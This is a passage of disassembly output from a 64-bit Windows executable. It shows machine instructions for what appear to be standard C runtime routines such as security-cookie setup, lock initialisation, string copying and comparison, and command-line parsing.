   140007b49:	e8 fa c5 ff ff       	call   0x140004148
   140007b4e:	cc                   	int3
   140007b4f:	45 33 c9             	xor    %r9d,%r9d
   140007b52:	45 33 c0             	xor    %r8d,%r8d
   140007b55:	33 d2                	xor    %edx,%edx
   140007b57:	33 c9                	xor    %ecx,%ecx
   140007b59:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140007b5e:	e8 e5 c5 ff ff       	call   0x140004148
   140007b63:	cc                   	int3
   140007b64:	45 33 c9             	xor    %r9d,%r9d
   140007b67:	45 33 c0             	xor    %r8d,%r8d
   140007b6a:	33 d2                	xor    %edx,%edx
   140007b6c:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140007b71:	e8 d2 c5 ff ff       	call   0x140004148
   140007b76:	cc                   	int3
   140007b77:	cc                   	int3
   140007b78:	89 0d 12 37 01 00    	mov    %ecx,0x13712(%rip)        # 0x14001b290
   140007b7e:	c3                   	ret
   140007b7f:	cc                   	int3
   140007b80:	48 83 ec 28          	sub    $0x28,%rsp
   140007b84:	85 c9                	test   %ecx,%ecx
   140007b86:	78 20                	js     0x140007ba8
   140007b88:	83 f9 02             	cmp    $0x2,%ecx
   140007b8b:	7e 0d                	jle    0x140007b9a
   140007b8d:	83 f9 03             	cmp    $0x3,%ecx
   140007b90:	75 16                	jne    0x140007ba8
   140007b92:	8b 05 30 3d 01 00    	mov    0x13d30(%rip),%eax        # 0x14001b8c8
   140007b98:	eb 21                	jmp    0x140007bbb
   140007b9a:	8b 05 28 3d 01 00    	mov    0x13d28(%rip),%eax        # 0x14001b8c8
   140007ba0:	89 0d 22 3d 01 00    	mov    %ecx,0x13d22(%rip)        # 0x14001b8c8
   140007ba6:	eb 13                	jmp    0x140007bbb
   140007ba8:	e8 cb c9 ff ff       	call   0x140004578
   140007bad:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140007bb3:	e8 70 c5 ff ff       	call   0x140004128
   140007bb8:	83 c8 ff             	or     $0xffffffff,%eax
   140007bbb:	48 83 c4 28          	add    $0x28,%rsp
   140007bbf:	c3                   	ret
   140007bc0:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140007bc5:	55                   	push   %rbp
   140007bc6:	48 8b ec             	mov    %rsp,%rbp
   140007bc9:	48 83 ec 20          	sub    $0x20,%rsp
   140007bcd:	48 8b 05 2c 14 01 00 	mov    0x1142c(%rip),%rax        # 0x140019000
   140007bd4:	48 83 65 18 00       	andq   $0x0,0x18(%rbp)
   140007bd9:	48 bb 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rbx
   140007be0:	2b 00 00 
   140007be3:	48 3b c3             	cmp    %rbx,%rax
   140007be6:	75 6f                	jne    0x140007c57
   140007be8:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140007bec:	ff 15 ee 95 00 00    	call   *0x95ee(%rip)        # 0x1400111e0
   140007bf2:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140007bf6:	48 89 45 10          	mov    %rax,0x10(%rbp)
   140007bfa:	ff 15 98 94 00 00    	call   *0x9498(%rip)        # 0x140011098
   140007c00:	8b c0                	mov    %eax,%eax
   140007c02:	48 31 45 10          	xor    %rax,0x10(%rbp)
   140007c06:	ff 15 cc 95 00 00    	call   *0x95cc(%rip)        # 0x1400111d8
   140007c0c:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   140007c10:	8b c0                	mov    %eax,%eax
   140007c12:	48 31 45 10          	xor    %rax,0x10(%rbp)
   140007c16:	ff 15 b4 95 00 00    	call   *0x95b4(%rip)        # 0x1400111d0
   140007c1c:	8b 45 20             	mov    0x20(%rbp),%eax
   140007c1f:	48 c1 e0 20          	shl    $0x20,%rax
   140007c23:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   140007c27:	48 33 45 20          	xor    0x20(%rbp),%rax
   140007c2b:	48 33 45 10          	xor    0x10(%rbp),%rax
   140007c2f:	48 33 c1             	xor    %rcx,%rax
   140007c32:	48 b9 ff ff ff ff ff 	movabs $0xffffffffffff,%rcx
   140007c39:	ff 00 00 
   140007c3c:	48 23 c1             	and    %rcx,%rax
   140007c3f:	48 b9 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rcx
   140007c46:	2b 00 00 
   140007c49:	48 3b c3             	cmp    %rbx,%rax
   140007c4c:	48 0f 44 c1          	cmove  %rcx,%rax
   140007c50:	48 89 05 a9 13 01 00 	mov    %rax,0x113a9(%rip)        # 0x140019000
   140007c57:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   140007c5c:	48 f7 d0             	not    %rax
   140007c5f:	48 89 05 a2 13 01 00 	mov    %rax,0x113a2(%rip)        # 0x140019008
   140007c66:	48 83 c4 20          	add    $0x20,%rsp
   140007c6a:	5d                   	pop    %rbp
   140007c6b:	c3                   	ret
   140007c6c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007c71:	57                   	push   %rdi
   140007c72:	48 83 ec 20          	sub    $0x20,%rsp
   140007c76:	48 8d 1d 3b f6 00 00 	lea    0xf63b(%rip),%rbx        # 0x1400172b8
   140007c7d:	48 8d 3d 34 f6 00 00 	lea    0xf634(%rip),%rdi        # 0x1400172b8
   140007c84:	eb 0e                	jmp    0x140007c94
   140007c86:	48 8b 03             	mov    (%rbx),%rax
   140007c89:	48 85 c0             	test   %rax,%rax
   140007c8c:	74 02                	je     0x140007c90
   140007c8e:	ff d0                	call   *%rax
   140007c90:	48 83 c3 08          	add    $0x8,%rbx
   140007c94:	48 3b df             	cmp    %rdi,%rbx
   140007c97:	72 ed                	jb     0x140007c86
   140007c99:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007c9e:	48 83 c4 20          	add    $0x20,%rsp
   140007ca2:	5f                   	pop    %rdi
   140007ca3:	c3                   	ret
   140007ca4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007ca9:	57                   	push   %rdi
   140007caa:	48 83 ec 20          	sub    $0x20,%rsp
   140007cae:	48 8d 1d 13 f6 00 00 	lea    0xf613(%rip),%rbx        # 0x1400172c8
   140007cb5:	48 8d 3d 0c f6 00 00 	lea    0xf60c(%rip),%rdi        # 0x1400172c8
   140007cbc:	eb 0e                	jmp    0x140007ccc
   140007cbe:	48 8b 03             	mov    (%rbx),%rax
   140007cc1:	48 85 c0             	test   %rax,%rax
   140007cc4:	74 02                	je     0x140007cc8
   140007cc6:	ff d0                	call   *%rax
   140007cc8:	48 83 c3 08          	add    $0x8,%rbx
   140007ccc:	48 3b df             	cmp    %rdi,%rbx
   140007ccf:	72 ed                	jb     0x140007cbe
   140007cd1:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007cd6:	48 83 c4 20          	add    $0x20,%rsp
   140007cda:	5f                   	pop    %rdi
   140007cdb:	c3                   	ret
   140007cdc:	48 8b c4             	mov    %rsp,%rax
   140007cdf:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140007ce3:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140007ce7:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140007ceb:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140007cef:	41 56                	push   %r14
   140007cf1:	48 83 ec 40          	sub    $0x40,%rsp
   140007cf5:	ff 15 ed 94 00 00    	call   *0x94ed(%rip)        # 0x1400111e8
   140007cfb:	45 33 f6             	xor    %r14d,%r14d
   140007cfe:	48 8b f8             	mov    %rax,%rdi
   140007d01:	48 85 c0             	test   %rax,%rax
   140007d04:	0f 84 a9 00 00 00    	je     0x140007db3
   140007d0a:	48 8b d8             	mov    %rax,%rbx
   140007d0d:	66 44 39 30          	cmp    %r14w,(%rax)
   140007d11:	74 14                	je     0x140007d27
   140007d13:	48 83 c3 02          	add    $0x2,%rbx
   140007d17:	66 44 39 33          	cmp    %r14w,(%rbx)
   140007d1b:	75 f6                	jne    0x140007d13
   140007d1d:	48 83 c3 02          	add    $0x2,%rbx
   140007d21:	66 44 39 33          	cmp    %r14w,(%rbx)
   140007d25:	75 ec                	jne    0x140007d13
   140007d27:	4c 89 74 24 38       	mov    %r14,0x38(%rsp)
   140007d2c:	48 2b d8             	sub    %rax,%rbx
   140007d2f:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   140007d34:	48 d1 fb             	sar    $1,%rbx
   140007d37:	4c 8b c0             	mov    %rax,%r8
   140007d3a:	33 d2                	xor    %edx,%edx
   140007d3c:	44 8d 4b 01          	lea    0x1(%rbx),%r9d
   140007d40:	33 c9                	xor    %ecx,%ecx
   140007d42:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   140007d47:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140007d4c:	ff 15 2e 94 00 00    	call   *0x942e(%rip)        # 0x140011180
   140007d52:	48 63 e8             	movslq %eax,%rbp
   140007d55:	85 c0                	test   %eax,%eax
   140007d57:	74 51                	je     0x140007daa
   140007d59:	48 8b cd             	mov    %rbp,%rcx
   140007d5c:	e8 d3 f5 ff ff       	call   0x140007334
   140007d61:	48 8b f0             	mov    %rax,%rsi
   140007d64:	48 85 c0             	test   %rax,%rax
   140007d67:	74 41                	je     0x140007daa
   140007d69:	4c 89 74 24 38       	mov    %r14,0x38(%rsp)
   140007d6e:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   140007d73:	44 8d 4b 01          	lea    0x1(%rbx),%r9d
   140007d77:	4c 8b c7             	mov    %rdi,%r8
   140007d7a:	33 d2                	xor    %edx,%edx
   140007d7c:	33 c9                	xor    %ecx,%ecx
   140007d7e:	89 6c 24 28          	mov    %ebp,0x28(%rsp)
   140007d82:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140007d87:	ff 15 f3 93 00 00    	call   *0x93f3(%rip)        # 0x140011180
   140007d8d:	85 c0                	test   %eax,%eax
   140007d8f:	75 0b                	jne    0x140007d9c
   140007d91:	48 8b ce             	mov    %rsi,%rcx
   140007d94:	e8 fb b9 ff ff       	call   0x140003794
   140007d99:	49 8b f6             	mov    %r14,%rsi
   140007d9c:	48 8b cf             	mov    %rdi,%rcx
   140007d9f:	ff 15 4b 94 00 00    	call   *0x944b(%rip)        # 0x1400111f0
   140007da5:	48 8b c6             	mov    %rsi,%rax
   140007da8:	eb 0b                	jmp    0x140007db5
   140007daa:	48 8b cf             	mov    %rdi,%rcx
   140007dad:	ff 15 3d 94 00 00    	call   *0x943d(%rip)        # 0x1400111f0
   140007db3:	33 c0                	xor    %eax,%eax
   140007db5:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140007dba:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   140007dbf:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140007dc4:	48 8b 7c 24 68       	mov    0x68(%rsp),%rdi
   140007dc9:	48 83 c4 40          	add    $0x40,%rsp
   140007dcd:	41 5e                	pop    %r14
   140007dcf:	c3                   	ret
   140007dd0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007dd5:	57                   	push   %rdi
   140007dd6:	48 83 ec 20          	sub    $0x20,%rsp
   140007dda:	33 ff                	xor    %edi,%edi
   140007ddc:	39 3d 76 3e 01 00    	cmp    %edi,0x13e76(%rip)        # 0x14001bc58
   140007de2:	75 05                	jne    0x140007de9
   140007de4:	e8 23 13 00 00       	call   0x14000910c
   140007de9:	48 8b 1d a0 4f 01 00 	mov    0x14fa0(%rip),%rbx        # 0x14001cd90
   140007df0:	48 8d 05 83 a8 00 00 	lea    0xa883(%rip),%rax        # 0x14001267a
   140007df7:	48 85 db             	test   %rbx,%rbx
   140007dfa:	48 0f 44 d8          	cmove  %rax,%rbx
   140007dfe:	80 3b 20             	cmpb   $0x20,(%rbx)
   140007e01:	77 09                	ja     0x140007e0c
   140007e03:	80 3b 00             	cmpb   $0x0,(%rbx)
   140007e06:	74 33                	je     0x140007e3b
   140007e08:	85 ff                	test   %edi,%edi
   140007e0a:	74 29                	je     0x140007e35
   140007e0c:	80 3b 22             	cmpb   $0x22,(%rbx)
   140007e0f:	75 09                	jne    0x140007e1a
   140007e11:	33 c0                	xor    %eax,%eax
   140007e13:	85 ff                	test   %edi,%edi
   140007e15:	0f 94 c0             	sete   %al
   140007e18:	8b f8                	mov    %eax,%edi
   140007e1a:	0f b6 0b             	movzbl (%rbx),%ecx
   140007e1d:	e8 26 28 00 00       	call   0x14000a648
   140007e22:	85 c0                	test   %eax,%eax
   140007e24:	74 03                	je     0x140007e29
   140007e26:	48 ff c3             	inc    %rbx
   140007e29:	48 ff c3             	inc    %rbx
   140007e2c:	eb d0                	jmp    0x140007dfe
   140007e2e:	3c 20                	cmp    $0x20,%al
   140007e30:	77 09                	ja     0x140007e3b
   140007e32:	48 ff c3             	inc    %rbx
   140007e35:	8a 03                	mov    (%rbx),%al
   140007e37:	84 c0                	test   %al,%al
   140007e39:	75 f3                	jne    0x140007e2e
   140007e3b:	48 8b c3             	mov    %rbx,%rax
   140007e3e:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007e43:	48 83 c4 20          	add    $0x20,%rsp
   140007e47:	5f                   	pop    %rdi
   140007e48:	c3                   	ret
   140007e49:	cc                   	int3
   140007e4a:	cc                   	int3
   140007e4b:	cc                   	int3
   140007e4c:	40 53                	rex push %rbx
   140007e4e:	48 83 ec 20          	sub    $0x20,%rsp
   140007e52:	48 85 c9             	test   %rcx,%rcx
   140007e55:	74 0d                	je     0x140007e64
   140007e57:	48 85 d2             	test   %rdx,%rdx
   140007e5a:	74 08                	je     0x140007e64
   140007e5c:	4d 85 c0             	test   %r8,%r8
   140007e5f:	75 1c                	jne    0x140007e7d
   140007e61:	44 88 01             	mov    %r8b,(%rcx)
   140007e64:	e8 0f c7 ff ff       	call   0x140004578
   140007e69:	bb 16 00 00 00       	mov    $0x16,%ebx
   140007e6e:	89 18                	mov    %ebx,(%rax)
   140007e70:	e8 b3 c2 ff ff       	call   0x140004128
   140007e75:	8b c3                	mov    %ebx,%eax
   140007e77:	48 83 c4 20          	add    $0x20,%rsp
   140007e7b:	5b                   	pop    %rbx
   140007e7c:	c3                   	ret
   140007e7d:	4c 8b c9             	mov    %rcx,%r9
   140007e80:	4d 2b c8             	sub    %r8,%r9
   140007e83:	41 8a 00             	mov    (%r8),%al
   140007e86:	43 88 04 01          	mov    %al,(%r9,%r8,1)
   140007e8a:	49 ff c0             	inc    %r8
   140007e8d:	84 c0                	test   %al,%al
   140007e8f:	74 05                	je     0x140007e96
   140007e91:	48 ff ca             	dec    %rdx
   140007e94:	75 ed                	jne    0x140007e83
   140007e96:	48 85 d2             	test   %rdx,%rdx
   140007e99:	75 0e                	jne    0x140007ea9
   140007e9b:	88 11                	mov    %dl,(%rcx)
   140007e9d:	e8 d6 c6 ff ff       	call   0x140004578
   140007ea2:	bb 22 00 00 00       	mov    $0x22,%ebx
   140007ea7:	eb c5                	jmp    0x140007e6e
   140007ea9:	33 c0                	xor    %eax,%eax
   140007eab:	eb ca                	jmp    0x140007e77
   140007ead:	cc                   	int3
   140007eae:	cc                   	int3
   140007eaf:	cc                   	int3
   140007eb0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007eb5:	57                   	push   %rdi
   140007eb6:	48 83 ec 20          	sub    $0x20,%rsp
   140007eba:	48 63 d9             	movslq %ecx,%rbx
   140007ebd:	48 8d 3d fc 16 01 00 	lea    0x116fc(%rip),%rdi        # 0x1400195c0
   140007ec4:	48 03 db             	add    %rbx,%rbx
   140007ec7:	48 83 3c df 00       	cmpq   $0x0,(%rdi,%rbx,8)
   140007ecc:	75 11                	jne    0x140007edf
   140007ece:	e8 a9 00 00 00       	call   0x140007f7c
   140007ed3:	85 c0                	test   %eax,%eax
   140007ed5:	75 08                	jne    0x140007edf
   140007ed7:	8d 48 11             	lea    0x11(%rax),%ecx
   140007eda:	e8 45 f0 ff ff       	call   0x140006f24
   140007edf:	48 8b 0c df          	mov    (%rdi,%rbx,8),%rcx
   140007ee3:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007ee8:	48 83 c4 20          	add    $0x20,%rsp
   140007eec:	5f                   	pop    %rdi
   140007eed:	48 ff 25 54 92 00 00 	rex.W jmp *0x9254(%rip)        # 0x140011148
   140007ef4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007ef9:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140007efe:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140007f03:	57                   	push   %rdi
   140007f04:	48 83 ec 20          	sub    $0x20,%rsp
   140007f08:	bf 24 00 00 00       	mov    $0x24,%edi
   140007f0d:	48 8d 1d ac 16 01 00 	lea    0x116ac(%rip),%rbx        # 0x1400195c0
   140007f14:	8b ef                	mov    %edi,%ebp
   140007f16:	48 8b 33             	mov    (%rbx),%rsi
   140007f19:	48 85 f6             	test   %rsi,%rsi
   140007f1c:	74 1b                	je     0x140007f39
   140007f1e:	83 7b 08 01          	cmpl   $0x1,0x8(%rbx)
   140007f22:	74 15                	je     0x140007f39
   140007f24:	48 8b ce             	mov    %rsi,%rcx
   140007f27:	ff 15 43 92 00 00    	call   *0x9243(%rip)        # 0x140011170
   140007f2d:	48 8b ce             	mov    %rsi,%rcx
   140007f30:	e8 5f b8 ff ff       	call   0x140003794
   140007f35:	48 83 23 00          	andq   $0x0,(%rbx)
   140007f39:	48 83 c3 10          	add    $0x10,%rbx
   140007f3d:	48 ff cd             	dec    %rbp
   140007f40:	75 d4                	jne    0x140007f16
   140007f42:	48 8d 1d 7f 16 01 00 	lea    0x1167f(%rip),%rbx        # 0x1400195c8
   140007f49:	48 8b 4b f8          	mov    -0x8(%rbx),%rcx
   140007f4d:	48 85 c9             	test   %rcx,%rcx
   140007f50:	74 0b                	je     0x140007f5d
   140007f52:	83 3b 01             	cmpl   $0x1,(%rbx)
   140007f55:	75 06                	jne    0x140007f5d
   140007f57:	ff 15 13 92 00 00    	call   *0x9213(%rip)        # 0x140011170
   140007f5d:	48 83 c3 10          	add    $0x10,%rbx
   140007f61:	48 ff cf             	dec    %rdi
   140007f64:	75 e3                	jne    0x140007f49
   140007f66:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007f6b:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140007f70:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140007f75:	48 83 c4 20          	add    $0x20,%rsp
   140007f79:	5f                   	pop    %rdi
   140007f7a:	c3                   	ret
   140007f7b:	cc                   	int3
   140007f7c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007f81:	48 89 7c 24 10       	mov    %rdi,0x10(%rsp)
   140007f86:	41 56                	push   %r14
   140007f88:	48 83 ec 20          	sub    $0x20,%rsp
   140007f8c:	48 63 d9             	movslq %ecx,%rbx
   140007f8f:	48 83 3d d9 31 01 00 	cmpq   $0x0,0x131d9(%rip)        # 0x14001b170
   140007f96:	00 
   140007f97:	75 19                	jne    0x140007fb2
   140007f99:	e8 f6 f8 ff ff       	call   0x140007894
   140007f9e:	b9 1e 00 00 00       	mov    $0x1e,%ecx
   140007fa3:	e8 60 f9 ff ff       	call   0x140007908
   140007fa8:	b9 ff 00 00 00       	mov    $0xff,%ecx
   140007fad:	e8 5a ef ff ff       	call   0x140006f0c
   140007fb2:	48 03 db             	add    %rbx,%rbx
   140007fb5:	4c 8d 35 04 16 01 00 	lea    0x11604(%rip),%r14        # 0x1400195c0
   140007fbc:	49 83 3c de 00       	cmpq   $0x0,(%r14,%rbx,8)
   140007fc1:	74 07                	je     0x140007fca
   140007fc3:	b8 01 00 00 00       	mov    $0x1,%eax
   140007fc8:	eb 5e                	jmp    0x140008028
   140007fca:	b9 28 00 00 00       	mov    $0x28,%ecx
   140007fcf:	e8 60 f3 ff ff       	call   0x140007334
   140007fd4:	48 8b f8             	mov    %rax,%rdi
   140007fd7:	48 85 c0             	test   %rax,%rax
   140007fda:	75 0f                	jne    0x140007feb
   140007fdc:	e8 97 c5 ff ff       	call   0x140004578
   140007fe1:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   140007fe7:	33 c0                	xor    %eax,%eax
   140007fe9:	eb 3d                	jmp    0x140008028
   140007feb:	b9 0a 00 00 00       	mov    $0xa,%ecx
   140007ff0:	e8 bb fe ff ff       	call   0x140007eb0
   140007ff5:	90                   	nop
   140007ff6:	48 8b cf             	mov    %rdi,%rcx
   140007ff9:	49 83 3c de 00       	cmpq   $0x0,(%r14,%rbx,8)
   140007ffe:	75 13                	jne    0x140008013
   140008000:	45 33 c0             	xor    %r8d,%r8d
   140008003:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   140008008:	e8 4f b9 ff ff       	call   0x14000395c
   14000800d:	49 89 3c de          	mov    %rdi,(%r14,%rbx,8)
   140008011:	eb 06                	jmp    0x140008019
   140008013:	e8 7c b7 ff ff       	call   0x140003794
   140008018:	90                   	nop
   140008019:	48 8b 0d 40 16 01 00 	mov    0x11640(%rip),%rcx        # 0x140019660
   140008020:	ff 15 2a 91 00 00    	call   *0x912a(%rip)        # 0x140011150
   140008026:	eb 9b                	jmp    0x140007fc3
   140008028:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000802d:	48 8b 7c 24 38       	mov    0x38(%rsp),%rdi
   140008032:	48 83 c4 20          	add    $0x20,%rsp
   140008036:	41 5e                	pop    %r14
   140008038:	c3                   	ret
   140008039:	cc                   	int3
   14000803a:	cc                   	int3
   14000803b:	cc                   	int3
   14000803c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008041:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140008046:	57                   	push   %rdi
   140008047:	48 83 ec 20          	sub    $0x20,%rsp
   14000804b:	33 f6                	xor    %esi,%esi
   14000804d:	48 8d 1d 6c 15 01 00 	lea    0x1156c(%rip),%rbx        # 0x1400195c0
   140008054:	8d 7e 24             	lea    0x24(%rsi),%edi
   140008057:	83 7b 08 01          	cmpl   $0x1,0x8(%rbx)
   14000805b:	75 24                	jne    0x140008081
   14000805d:	48 63 c6             	movslq %esi,%rax
   140008060:	48 8d 15 69 38 01 00 	lea    0x13869(%rip),%rdx        # 0x14001b8d0
   140008067:	45 33 c0             	xor    %r8d,%r8d
   14000806a:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   14000806e:	ff c6                	inc    %esi
   140008070:	48 8d 0c ca          	lea    (%rdx,%rcx,8),%rcx
   140008074:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   140008079:	48 89 0b             	mov    %rcx,(%rbx)
   14000807c:	e8 db b8 ff ff       	call   0x14000395c
   140008081:	48 83 c3 10          	add    $0x10,%rbx
   140008085:	48 ff cf             	dec    %rdi
   140008088:	75 cd                	jne    0x140008057
   14000808a:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000808f:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140008094:	8d 47 01             	lea    0x1(%rdi),%eax
   140008097:	48 83 c4 20          	add    $0x20,%rsp
   14000809b:	5f                   	pop    %rdi
   14000809c:	c3                   	ret
   14000809d:	cc                   	int3
   14000809e:	cc                   	int3
   14000809f:	cc                   	int3
   1400080a0:	48 63 c9             	movslq %ecx,%rcx
   1400080a3:	48 8d 05 16 15 01 00 	lea    0x11516(%rip),%rax        # 0x1400195c0
   1400080aa:	48 03 c9             	add    %rcx,%rcx
   1400080ad:	48 8b 0c c8          	mov    (%rax,%rcx,8),%rcx
   1400080b1:	48 ff 25 98 90 00 00 	rex.W jmp *0x9098(%rip)        # 0x140011150
   1400080b8:	cc                   	int3
   1400080b9:	cc                   	int3
   1400080ba:	cc                   	int3
   1400080bb:	cc                   	int3
   1400080bc:	cc                   	int3
   1400080bd:	cc                   	int3
   1400080be:	cc                   	int3
   1400080bf:	cc                   	int3
   1400080c0:	cc                   	int3
   1400080c1:	cc                   	int3
   1400080c2:	cc                   	int3
   1400080c3:	cc                   	int3
   1400080c4:	cc                   	int3
   1400080c5:	cc                   	int3
   1400080c6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1400080cd:	00 00 00 
   1400080d0:	48 2b d1             	sub    %rcx,%rdx
   1400080d3:	f6 c1 07             	test   $0x7,%cl
   1400080d6:	74 14                	je     0x1400080ec
   1400080d8:	0f b6 01             	movzbl (%rcx),%eax
   1400080db:	3a 04 11             	cmp    (%rcx,%rdx,1),%al
   1400080de:	75 4f                	jne    0x14000812f
   1400080e0:	48 ff c1             	inc    %rcx
   1400080e3:	84 c0                	test   %al,%al
   1400080e5:	74 45                	je     0x14000812c
   1400080e7:	f6 c1 07             	test   $0x7,%cl
   1400080ea:	75 ec                	jne    0x1400080d8
   1400080ec:	49 bb 80 80 80 80 80 	movabs $0x8080808080808080,%r11
   1400080f3:	80 80 80 
   1400080f6:	49 ba ff fe fe fe fe 	movabs $0xfefefefefefefeff,%r10
   1400080fd:	fe fe fe 
   140008100:	67 8d 04 11          	lea    (%ecx,%edx,1),%eax
   140008104:	25 ff 0f 00 00       	and    $0xfff,%eax
   140008109:	3d f8 0f 00 00       	cmp    $0xff8,%eax
   14000810e:	77 c8                	ja     0x1400080d8
   140008110:	48 8b 01             	mov    (%rcx),%rax
   140008113:	48 3b 04 11          	cmp    (%rcx,%rdx,1),%rax
   140008117:	75 bf                	jne    0x1400080d8
   140008119:	4d 8d 0c 02          	lea    (%r10,%rax,1),%r9
   14000811d:	48 f7 d0             	not    %rax
   140008120:	48 83 c1 08          	add    $0x8,%rcx
   140008124:	49 23 c1             	and    %r9,%rax
   140008127:	49 85 c3             	test   %rax,%r11
   14000812a:	74 d4                	je     0x140008100
   14000812c:	33 c0                	xor    %eax,%eax
   14000812e:	c3                   	ret
   14000812f:	48 1b c0             	sbb    %rax,%rax
   140008132:	48 83 c8 01          	or     $0x1,%rax
   140008136:	c3                   	ret
   140008137:	cc                   	int3
   140008138:	40 53                	rex push %rbx
   14000813a:	48 83 ec 30          	sub    $0x30,%rsp
   14000813e:	48 8b d9             	mov    %rcx,%rbx
   140008141:	b9 0e 00 00 00       	mov    $0xe,%ecx
   140008146:	e8 65 fd ff ff       	call   0x140007eb0
   14000814b:	90                   	nop
   14000814c:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140008150:	48 85 c0             	test   %rax,%rax
   140008153:	74 3f                	je     0x140008194
   140008155:	48 8b 0d ac 39 01 00 	mov    0x139ac(%rip),%rcx        # 0x14001bb08
   14000815c:	48 8d 15 9d 39 01 00 	lea    0x1399d(%rip),%rdx        # 0x14001bb00
   140008163:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140008168:	48 85 c9             	test   %rcx,%rcx
   14000816b:	74 19                	je     0x140008186
   14000816d:	48 39 01             	cmp    %rax,(%rcx)
   140008170:	75 0f                	jne    0x140008181
   140008172:	48 8b 41 08          	mov    0x8(%rcx),%rax
   140008176:	48 89 42 08          	mov    %rax,0x8(%rdx)
   14000817a:	e8 15 b6 ff ff       	call   0x140003794
   14000817f:	eb 05                	jmp    0x140008186
   140008181:	48 8b d1             	mov    %rcx,%rdx
   140008184:	eb dd                	jmp    0x140008163
   140008186:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   14000818a:	e8 05 b6 ff ff       	call   0x140003794
   14000818f:	48 83 63 08 00       	andq   $0x0,0x8(%rbx)
   140008194:	b9 0e 00 00 00       	mov    $0xe,%ecx
   140008199:	e8 02 ff ff ff       	call   0x1400080a0
   14000819e:	48 83 c4 30          	add    $0x30,%rsp
   1400081a2:	5b                   	pop    %rbx
   1400081a3:	c3                   	ret
   1400081a4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400081a9:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400081ae:	57                   	push   %rdi
   1400081af:	48 83 ec 30          	sub    $0x30,%rsp
   1400081b3:	33 ff                	xor    %edi,%edi
   1400081b5:	8d 4f 01             	lea    0x1(%rdi),%ecx
   1400081b8:	e8 f3 fc ff ff       	call   0x140007eb0
   1400081bd:	90                   	nop
   1400081be:	8d 5f 03             	lea    0x3(%rdi),%ebx
   1400081c1:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   1400081c5:	3b 1d ad 3a 01 00    	cmp    0x13aad(%rip),%ebx        # 0x14001bc78
   1400081cb:	7d 63                	jge    0x140008230
   1400081cd:	48 63 f3             	movslq %ebx,%rsi
   1400081d0:	48 8b 05 99 3a 01 00 	mov    0x13a99(%rip),%rax        # 0x14001bc70
   1400081d7:	48 8b 0c f0          	mov    (%rax,%rsi,8),%rcx
   1400081db:	48 85 c9             	test   %rcx,%rcx
   1400081de:	74 4c                	je     0x14000822c
   1400081e0:	f6 41 18 83          	testb  $0x83,0x18(%rcx)
   1400081e4:	74 10                	je     0x1400081f6
   1400081e6:	e8 89 aa ff ff       	call   0x140002c74
   1400081eb:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400081ee:	74 06                	je     0x1400081f6
   1400081f0:	ff c7                	inc    %edi
   1400081f2:	89 7c 24 24          	mov    %edi,0x24(%rsp)
   1400081f6:	83 fb 14             	cmp    $0x14,%ebx
   1400081f9:	7c 31                	jl     0x14000822c
   1400081fb:	48 8b 05 6e 3a 01 00 	mov    0x13a6e(%rip),%rax        # 0x14001bc70
   140008202:	48 8b 0c f0          	mov    (%rax,%rsi,8),%rcx
   140008206:	48 83 c1 30          	add    $0x30,%rcx
   14000820a:	ff 15 60 8f 00 00    	call   *0x8f60(%rip)        # 0x140011170
   140008210:	48 8b 0d 59 3a 01 00 	mov    0x13a59(%rip),%rcx        # 0x14001bc70
   140008217:	48 8b 0c f1          	mov    (%rcx,%rsi,8),%rcx
   14000821b:	e8 74 b5 ff ff       	call   0x140003794
